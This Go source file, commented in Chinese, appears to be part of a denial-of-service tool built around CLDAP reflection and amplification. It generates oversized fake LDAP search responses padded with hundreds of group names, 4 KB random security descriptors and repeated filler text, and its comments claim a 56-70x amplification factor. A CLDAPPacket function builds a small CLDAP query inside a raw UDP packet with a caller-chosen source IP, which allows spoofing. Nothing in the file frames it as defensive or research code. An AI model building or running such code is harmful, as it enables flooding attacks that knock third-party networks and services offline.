package protocol

import (
	"bytes"
	"math/rand"
	"strconv"
	"strings"
)

// CLDAPResponseBuffer 生成CLDAP协议响应
// 放大倍数：56-70倍
// 返回多个响应包以便循环发送
func CLDAPResponseBuffer() [][]byte {
	// 创建多个响应包用于循环发送
	responses := make([][]byte, 0, 5)
	
	// 基本用户对象包
	baseObjectResponse := generateCLDAPBaseResponse()
	responses = append(responses, baseObjectResponse)
	
	// 组成员关系包（通常很大）
	groupMembershipResponse := generateCLDAPGroupMembershipResponse()
	responses = append(responses, groupMembershipResponse)
	
	// 安全描述符包（非常大）
	securityResponse := generateCLDAPSecurityResponse()
	responses = append(responses, securityResponse)
	
	// 域控制器信息包
	dcInfoResponse := generateCLDAPDomainControllerResponse()
	responses = append(responses, dcInfoResponse)
	
	// 额外的放大数据包
	ampResponse := generateCLDAPAmplificationResponse()
	responses = append(responses, ampResponse)
	
	return responses
}

// generateCLDAPBaseResponse 生成基本用户对象信息包
func generateCLDAPBaseResponse() []byte {
	var buf bytes.Buffer
	
	// LDAP消息结构
	// SEQUENCE Tag
	buf.WriteByte(0x30)
	// 总长度占位符
	buf.Write([]byte{0x84, 0x00, 0x01, 0x00, 0x00})
	
	// messageID (INTEGER)
	messageID := rand.Intn(65535)
	buf.Write([]byte{0x02, 0x02})
	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
	
	// SearchResultEntry 标签
	buf.Write([]byte{0x64})
	// 长度占位符
	buf.Write([]byte{0x84, 0x00, 0x00, 0xFF, 0x00})
	
	// objectName (OCTET STRING)
	objectName := "dc=example,dc=com"
	buf.Write([]byte{0x04, byte(len(objectName))})
	buf.Write([]byte(objectName))
	
	// attributes (SEQUENCE)
	buf.Write([]byte{0x30})
	// 长度占位符
	buf.Write([]byte{0x84, 0x00, 0x00, 0xF0, 0x00})
	
	// 添加基本用户对象信息
	
	// 添加对象类
	addCLDAPAttribute(&buf, "objectClass", []string{
		"top", "person", "organizationalPerson", "user", "computer"})
	
	// 添加用户账号控制信息
	addCLDAPAttribute(&buf, "userAccountControl", []string{"4096"})
	
	// 添加唯一标识符
	addCLDAPAttribute(&buf, "objectGUID", []string{generateRandomHexString(32)})
	
	// 添加SID
	addCLDAPAttribute(&buf, "objectSid", []string{generateRandomHexString(28)})
	
	// 添加DN
	dn := "CN=DESKTOP-" + generateRandomHexString(8) + ",OU=Computers,DC=example,DC=com"
	addCLDAPAttribute(&buf, "distinguishedName", []string{dn})
	
	// 添加SAM账号名
	samAccountName := "DESKTOP-" + generateRandomHexString(8) + "$"
	addCLDAPAttribute(&buf, "sAMAccountName", []string{samAccountName})
	
	// 添加主机名
	addCLDAPAttribute(&buf, "dNSHostName", []string{
		samAccountName[:len(samAccountName)-1] + ".example.com"})
	
	return buf.Bytes()
}

// generateCLDAPGroupMembershipResponse 生成组成员关系包
func generateCLDAPGroupMembershipResponse() []byte {
	var buf bytes.Buffer
	
	// LDAP消息结构
	buf.WriteByte(0x30)
	buf.Write([]byte{0x84, 0x00, 0x02, 0x00, 0x00})
	
	// messageID
	messageID := rand.Intn(65535)
	buf.Write([]byte{0x02, 0x02})
	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
	
	// SearchResultEntry
	buf.Write([]byte{0x64})
	buf.Write([]byte{0x84, 0x00, 0x01, 0xFF, 0x00})
	
	// objectName
	objectName := "cn=groups,dc=example,dc=com"
	buf.Write([]byte{0x04, byte(len(objectName))})
	buf.Write([]byte(objectName))
	
	// attributes
	buf.Write([]byte{0x30})
	buf.Write([]byte{0x84, 0x00, 0x01, 0xF0, 0x00})
	
	// 添加组成员关系 - 创建大量组以实现放大
	groupMemberships := []string{}
	for i := 0; i < 100; i++ {
		groupMemberships = append(groupMemberships, 
			"CN=Group"+strconv.Itoa(i)+",OU=Security Groups,DC=example,DC=com")
	}
	addCLDAPAttribute(&buf, "memberOf", groupMemberships)
	
	// 添加组描述信息
	for i := 0; i < 20; i++ {
		addCLDAPAttribute(&buf, "groupType"+strconv.Itoa(i), []string{
			"Universal, Security Enabled (" + strconv.Itoa(i*8+2147483652) + ")"})
	}
	
	return buf.Bytes()
}

// generateCLDAPSecurityResponse 生成安全描述符包
func generateCLDAPSecurityResponse() []byte {
	var buf bytes.Buffer
	
	// LDAP消息结构
	buf.WriteByte(0x30)
	buf.Write([]byte{0x84, 0x00, 0x03, 0x00, 0x00})
	
	// messageID
	messageID := rand.Intn(65535)
	buf.Write([]byte{0x02, 0x02})
	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
	
	// SearchResultEntry
	buf.Write([]byte{0x64})
	buf.Write([]byte{0x84, 0x00, 0x02, 0xFF, 0x00})
	
	// objectName
	objectName := "cn=security,dc=example,dc=com"
	buf.Write([]byte{0x04, byte(len(objectName))})
	buf.Write([]byte(objectName))
	
	// attributes
	buf.Write([]byte{0x30})
	buf.Write([]byte{0x84, 0x00, 0x02, 0xF0, 0x00})
	
	// 添加安全描述符 - 这些通常非常大，可以用于放大
	securityDescriptors := make([]string, 5)
	for i := 0; i < 5; i++ {
		securityDescriptors[i] = generateRandomHexString(4096) // 一个大的安全描述符
	}
	addCLDAPAttribute(&buf, "nTSecurityDescriptor", securityDescriptors)
	
	return buf.Bytes()
}

// generateCLDAPDomainControllerResponse 生成域控制器信息包
func generateCLDAPDomainControllerResponse() []byte {
	var buf bytes.Buffer
	
	// LDAP消息结构
	buf.WriteByte(0x30)
	buf.Write([]byte{0x84, 0x00, 0x00, 0x80, 0x00})
	
	// messageID
	messageID := rand.Intn(65535)
	buf.Write([]byte{0x02, 0x02})
	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
	
	// SearchResultEntry
	buf.Write([]byte{0x64})
	buf.Write([]byte{0x84, 0x00, 0x00, 0x70, 0x00})
	
	// objectName
	objectName := "cn=domaincontroller,dc=example,dc=com"
	buf.Write([]byte{0x04, byte(len(objectName))})
	buf.Write([]byte(objectName))
	
	// attributes
	buf.Write([]byte{0x30})
	buf.Write([]byte{0x84, 0x00, 0x00, 0x60, 0x00})
	
	// 添加服务主体名称 (SPNs) - 这些通常很大
	spns := []string{
		"HOST/dc1.example.com",
		"HOST/dc1",
		"E3514235-4B06-11D1-AB04-00C04FC2DCD2/4583ad75-f546-4138-9689-b20dd75faef0/example.com",
		"ldap/dc1.example.com/example.com",
		"ldap/dc1.example.com",
		"ldap/dc1",
		"ldap/dc1.example.com/DomainDnsZones.example.com",
		"ldap/dc1.example.com/ForestDnsZones.example.com",
		"TERMSRV/dc1.example.com",
		"TERMSRV/dc1",
		"DNS/dc1.example.com",
		"GC/dc1.example.com/example.com",
		"RestrictedKrbHost/dc1.example.com",
		"RestrictedKrbHost/dc1",
	}
	addCLDAPAttribute(&buf, "servicePrincipalName", spns)
	
	// 添加操作系统信息
	addCLDAPAttribute(&buf, "operatingSystem", []string{"Windows Server 2019"})
	addCLDAPAttribute(&buf, "operatingSystemVersion", []string{"10.0 (17763)"})
	addCLDAPAttribute(&buf, "operatingSystemServicePack", []string{"Service Pack 1"})
	
	return buf.Bytes()
}

// generateCLDAPAmplificationResponse 生成额外的放大数据包
func generateCLDAPAmplificationResponse() []byte {
	var buf bytes.Buffer
	
	// LDAP消息结构
	buf.WriteByte(0x30)
	buf.Write([]byte{0x84, 0x00, 0x04, 0x00, 0x00})
	
	// messageID
	messageID := rand.Intn(65535)
	buf.Write([]byte{0x02, 0x02})
	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
	
	// SearchResultEntry
	buf.Write([]byte{0x64})
	buf.Write([]byte{0x84, 0x00, 0x03, 0xFF, 0x00})
	
	// objectName
	objectName := "cn=amplification,dc=example,dc=com"
	buf.Write([]byte{0x04, byte(len(objectName))})
	buf.Write([]byte(objectName))
	
	// attributes
	buf.Write([]byte{0x30})
	buf.Write([]byte{0x84, 0x00, 0x03, 0xF0, 0x00})
	
	// 为了最大化放大效果，添加一些具有长值的属性
	for i := 0; i < 10; i++ {
		attrName := "customAttribute" + strconv.Itoa(i)
		attrValues := []string{strings.Repeat("Long value for amplification. ", 500)}
		addCLDAPAttribute(&buf, attrName, attrValues)
	}
	
	return buf.Bytes()
}

// addCLDAPAttribute 添加LDAP属性到缓冲区
func addCLDAPAttribute(buf *bytes.Buffer, attrType string, attrValues []string) {
	// 属性序列
	buf.Write([]byte{0x30})
	
	// 长度占位符
	attrLen := 2 + len(attrType) + 2
	for _, val := range attrValues {
		attrLen += 2 + len(val)
	}
	
	if attrLen < 128 {
		buf.WriteByte(byte(attrLen))
	} else if attrLen < 256 {
		buf.Write([]byte{0x81, byte(attrLen)})
	} else {
		buf.Write([]byte{0x82, byte(attrLen >> 8), byte(attrLen)})
	}
	
	// 属性类型
	buf.Write([]byte{0x04, byte(len(attrType))})
	buf.Write([]byte(attrType))
	
	// 属性值集合
	buf.Write([]byte{0x31})
	
	// 值集合长度
	valuesLen := 0
	for _, val := range attrValues {
		valuesLen += 2 + len(val)
	}
	
	if valuesLen < 128 {
		buf.WriteByte(byte(valuesLen))
	} else if valuesLen < 256 {
		buf.Write([]byte{0x81, byte(valuesLen)})
	} else {
		buf.Write([]byte{0x82, byte(valuesLen >> 8), byte(valuesLen)})
	}
	
	// 各个值
	for _, val := range attrValues {
		if len(val) < 128 {
			buf.Write([]byte{0x04, byte(len(val))})
		} else if len(val) < 256 {
			buf.Write([]byte{0x04, 0x81, byte(len(val))})
		} else {
			buf.Write([]byte{0x04, 0x82, byte(len(val) >> 8), byte(len(val))})
		}
		buf.Write([]byte(val))
	}
}

// generateRandomHexString 生成指定长度的随机十六进制字符串
func generateRandomHexString(length int) string {
	const hexChars = "0123456789ABCDEF"
	result := make([]byte, length)
	for i := range result {
		result[i] = hexChars[rand.Intn(len(hexChars))]
	}
	return string(result)
}

func CLDAPPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
    payload := []byte{
        0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04, 0x00, 0x0a, 0x01, 0x00,
        0x0a, 0x01, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00,
        0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x63, 0x6c, 0x61, 0x73,
        0x73, 0x30, 0x00,
    }    
    return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
}